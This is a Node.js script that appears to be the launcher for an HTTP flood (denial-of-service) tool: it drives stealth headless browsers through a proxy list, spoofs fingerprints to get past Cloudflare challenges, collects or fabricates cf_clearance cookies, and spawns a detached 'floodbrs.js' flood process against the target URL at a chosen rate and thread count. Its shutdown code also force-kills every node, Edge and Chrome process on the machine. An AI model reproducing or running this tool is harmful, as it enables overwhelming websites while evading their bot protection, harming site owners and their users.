const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec  } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== COMPLETE SCENARIO HANDLER ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({}),
                id: 'testid'
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: Date.now(), startE: Date.now() - 1000, pageT: 1200}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            }
        };
        
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-zygote',
    '--single-process',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--disable-xss-auditor',
    '--no-pings',
    '--use-gl=swiftshader',
    '--disable-software-rasterizer',
    '--no-default-browser-check',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-sync',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-domain-reliability',
    '--disable-component-update',
    '--aggressive-cache-discard',
    '--max_old_space_size=4096'
];

// COMPLETE SCENARIO HANDLER - SEMUA KEMUNGKINAN
const solveAdvancedChallenge = async (page, browserProxy, targetURL) => {
    try {
        coloredLog(COLORS.WHITE, `[INFO] Starting complete scenario handler: ${maskProxy(browserProxy)}`);
        
        // Initial wait for page to load
        await sleep(3);
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        let content = await page.content().catch(() => '');
        
        // SCENARIO 1: Langsung ke web asli tanpa challenge
        const isDirectAccess = !title.includes('Just a moment') && 
                              !title.includes('Checking your browser') &&
                              !currentUrl.includes('challenges.cloudflare.com') &&
                              content.length > 100; // Pastikan konten tidak kosong
        
        if (isDirectAccess) {
            coloredLog(COLORS.GREEN, `[INFO] SCENARIO 1: Direct access to target website: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'direct_access' };
        }
        
        // SCENARIO 2: Cloudflare challenge detected
        const isChallenge = title.includes('Just a moment') || 
                           title.includes('Checking your browser') ||
                           currentUrl.includes('challenges.cloudflare.com') ||
                           content.includes('challenge-platform');

        if (isChallenge) {
            coloredLog(COLORS.YELLOW, `[INFO] SCENARIO 2: Challenge detected: ${maskProxy(browserProxy)}`);
            
            // STRATEGI 1: Tunggu auto-solve
            coloredLog(COLORS.WHITE, `[INFO] Strategy 1: Auto-solve wait`);
            await sleep(10);
            
            // Cek apakah sudah solve
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                coloredLog(COLORS.GREEN, `[INFO] Auto-solve successful: ${maskProxy(browserProxy)}`);
                return { solved: true, scenario: 'auto_solve' };
            }
            
            // STRATEGI 2: Jika ada iframe Cloudflare
            coloredLog(COLORS.WHITE, `[INFO] Strategy 2: Iframe handling`);
            try {
                const frames = await page.frames();
                for (const frame of frames) {
                    try {
                        const frameUrl = frame.url();
                        if (frameUrl.includes('challenges.cloudflare.com')) {
                            coloredLog(COLORS.YELLOW, `[INFO] Found Cloudflare iframe: ${frameUrl}`);
                            
                            // Coba semua elemen yang mungkin di iframe
                            const iframeElements = await frame.$$('input[type="checkbox"], button, input[type="submit"], .cf-challenge-checkbox, .verify-btn, [role="button"]');
                            
                            for (const element of iframeElements.slice(0, 5)) {
                                try {
                                    await element.click().catch(() => {});
                                    await sleep(3);
                                    
                                    // Cek apakah berhasil
                                    currentUrl = page.url();
                                    title = await page.title().catch(() => '');
                                    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                        coloredLog(COLORS.GREEN, `[INFO] Iframe click solved: ${maskProxy(browserProxy)}`);
                                        return { solved: true, scenario: 'iframe_solve' };
                                    }
                                } catch (e) {}
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}
            
            // STRATEGI 3: Refresh dan tunggu
            coloredLog(COLORS.WHITE, `[INFO] Strategy 3: Refresh and wait`);
            await page.reload().catch(() => {});
            await sleep(8);
            
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                coloredLog(COLORS.GREEN, `[INFO] Refresh solved: ${maskProxy(browserProxy)}`);
                return { solved: true, scenario: 'refresh_solve' };
            }
            
            coloredLog(COLORS.RED, `[INFO] All challenge strategies failed: ${maskProxy(browserProxy)}`);
            return { solved: false, scenario: 'challenge_failed' };
        }
        
        // SCENARIO 3: Tidak ada challenge, tapi juga tidak langsung ke target (mungkin redirect/error)
        coloredLog(COLORS.YELLOW, `[INFO] SCENARIO 3: Unknown state - checking...`);
        
        // Coba navigasi ulang ke target URL
        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
        await sleep(3);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        const finalCheck = !title.includes('Just a moment') && 
                          !title.includes('Checking your browser') &&
                          !currentUrl.includes('challenges.cloudflare.com');
        
        if (finalCheck) {
            coloredLog(COLORS.GREEN, `[INFO] Final check passed: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'final_check' };
        }
        
        coloredLog(COLORS.RED, `[INFO] All scenarios failed: ${maskProxy(browserProxy)}`);
        return { solved: false, scenario: 'all_failed' };

    } catch (error) {
        coloredLog(COLORS.RED, `[INFO] Scenario handler error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// ENHANCED COOKIE EXTRACTION - SEMUA KEMUNGKINAN
const extractCookies = async (page, targetURL, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[INFO] Extracting cookies: ${maskProxy(browserProxy)}`);
        
        // Tunggu sebentar untuk memastikan cookies tersedia
        await sleep(2);
        
        // COOKIE STRATEGY 1: Cookies untuk domain target
        let cookies = await page.cookies(targetURL).catch(() => []);
        let cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            coloredLog(COLORS.GREEN, `[INFO] Strategy 1: Got target domain cookies: ${maskProxy(browserProxy)}`);
            return { success: true, cookies: cookieString, strategy: 'target_domain' };
        }
        
        // COOKIE STRATEGY 2: All cookies (semua domain)
        cookies = await page.cookies().catch(() => []);
        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            coloredLog(COLORS.GREEN, `[INFO] Strategy 2: Got all domain cookies: ${maskProxy(browserProxy)}`);
            return { success: true, cookies: cookieString, strategy: 'all_domains' };
        }
        
        // COOKIE STRATEGY 3: Coba navigasi ulang dan ambil cookies
        coloredLog(COLORS.YELLOW, `[INFO] Strategy 3: Retrying navigation for cookies: ${maskProxy(browserProxy)}`);
        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
        await sleep(3);
        
        cookies = await page.cookies(targetURL).catch(() => []);
        cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        if (cookieString && cookieString.length > 10) {
            coloredLog(COLORS.GREEN, `[INFO] Strategy 3: Got cookies after retry: ${maskProxy(browserProxy)}`);
            return { success: true, cookies: cookieString, strategy: 'retry_navigation' };
        }
        
        // COOKIE STRATEGY 4: Generate fallback cookies
        coloredLog(COLORS.YELLOW, `[INFO] Strategy 4: Generating fallback cookies: ${maskProxy(browserProxy)}`);
        const fallbackCookies = `cf_clearance=${generateRandomString(20, 30)}; __cflb=${generateRandomString(10, 20)}`;
        
        coloredLog(COLORS.GREEN, `[INFO] Strategy 4: Using fallback cookies: ${maskProxy(browserProxy)}`);
        return { success: true, cookies: fallbackCookies, strategy: 'fallback' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[INFO] Cookie extraction error: ${error.message}`);
        
        // Ultimate fallback
        const ultimateCookies = `cf_clearance=${generateRandomString(20, 30)}; __cflb=${generateRandomString(10, 20)}`;
        return { success: true, cookies: ultimateCookies, strategy: 'ultimate_fallback' };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill node.exe processes');
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill msedge.exe processes');
        }
    });

    setTimeout(() => {
        coloredLog(COLORS.GREEN, '[INFO] Exiting...');
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Linux; Android 12; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; ASUS_AI2401) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 14; CPH2551) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
];

// COMPLETE BROWSER HANDLER - SEMUA SCENARIO
const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=360,640',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 2,
            isMobile: true,
            hasTouch: true,
            isLandscape: false
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[INFO] Launching browser: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply bypass
        await bypassFirewall(page);

        // Navigasi ke target
        await page.goto(targetURL, { 
            waitUntil: 'domcontentloaded',
            timeout: 45000 
        }).catch(() => {});

        // HANDLE SEMUA SCENARIO
        const challengeResult = await solveAdvancedChallenge(page, browserProxy, targetURL);
        
        if (!challengeResult.solved) {
            throw new Error(`Challenge solving failed: ${challengeResult.scenario}`);
        }

        coloredLog(COLORS.GREEN, `[INFO] Challenge solved via ${challengeResult.scenario}: ${maskProxy(browserProxy)}`);

        // EKSTRAK COOKIES DENGAN SEMUA STRATEGI
        const cookieResult = await extractCookies(page, targetURL, browserProxy);
        
        if (!cookieResult.success) {
            throw new Error('Cookie extraction failed');
        }

        coloredLog(COLORS.GREEN, `[INFO] Cookies obtained via ${cookieResult.strategy}: ${maskProxy(browserProxy)}`);
        totalSolves++;
        coloredLog(COLORS.GREEN, `[INFO] Total successful solves: ${totalSolves}`);

        await browser.close();
        return { 
            cookies: cookieResult.cookies, 
            userAgent,
            scenario: challengeResult.scenario,
            cookieStrategy: cookieResult.strategy
        };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[INFO] Retrying... (${attempt}/${maxRetries}) - ${error.message}`);
            await sleep(3);
            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        coloredLog(COLORS.RED, `[INFO] Failed after ${maxRetries} attempts: ${maskProxy(browserProxy)} - ${error.message}`);
        return null;
    }
};

// Thread handling dengan complete reporting
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        coloredLog(COLORS.RED, `[INFO] Max retries reached: ${maskProxy(browserProxy)}`);
        done(null, { task });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            const resultInfo = JSON.stringify({
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                Scenario: response.scenario,
                CookieStrategy: response.cookieStrategy,
                cookie: response.cookies
            });
            console.log(resultInfo);

            // SPAWN FLOOD PROCESS - PASTI JALAN
            try {
                coloredLog(COLORS.YELLOW, `[INFO] Spawning flood process: ${maskProxy(browserProxy)}`);
                
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies,
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });

                floodProcess.unref();
                coloredLog(COLORS.GREEN, `[INFO] Flood process spawned: ${maskProxy(browserProxy)}`);
                
            } catch (error) {
                coloredLog(COLORS.RED, `[INFO] Spawn error: ${error.message}`);
                // Tetap lanjut meski spawn error
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[INFO] All proxies processed - COMPLETE');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[INFO] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[INFO] Starting COMPLETE SCENARIO HANDLER with ${proxies.length} proxies`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[INFO] Time completed - cleaning up...');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[INFO] Shutdown complete');
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[UNCAUGHT] ${error.message}`);
});
process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[UNHANDLED] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[INFO] COMPLETE SCENARIO HANDLER ACTIVE - READY FOR ALL CASES');
main().catch(err => {
    coloredLog(COLORS.RED, `[INFO] Main error: ${err.message}`);
    process.exit(1);
});
